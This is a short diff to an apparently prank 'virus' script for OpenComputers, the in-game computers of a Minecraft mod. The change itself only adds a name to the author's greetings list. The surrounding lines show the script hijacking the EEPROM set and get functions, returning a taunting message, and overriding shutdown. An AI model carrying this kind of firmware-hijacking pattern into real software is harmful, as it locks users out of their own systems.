@@ -46,7 +46,7 @@ function lol()
         "Replacing the EEPROM is for broke people.";
         "";
         -- put some greetz or something
-        "GREETZ: OCboy3, Chouladalls, Kurhox, SirKamilMarko";
+        "GREETZ: OCboy3, agentfish, Chouladalls, Kurhox, SirKamilMarko";
     }
 
     displayTable(ok)
@@ -79,7 +79,7 @@ component.proxy(cl("eeprom")()).set = function(...) -- component.eeprom.set("tes
 end
 
 component.proxy(cl("eeprom")()).get = function() -- print(component.eeprom.get())
-  return "GREETZ: OCboy3, Chouladalls, Kurhox, SirKamilMarko. Fun Fact: OCboy3 will smack your OpenComputer's monitor with a baseball bat. (jk)"
+  return "GREETZ: OCboy3, agentfish,Chouladalls, Kurhox, SirKamilMarko. Fun Fact: OCboy3 will smack your OpenComputer's monitor with a baseball bat. (jk)"
 end
 
 computer.shutdown = function(...)
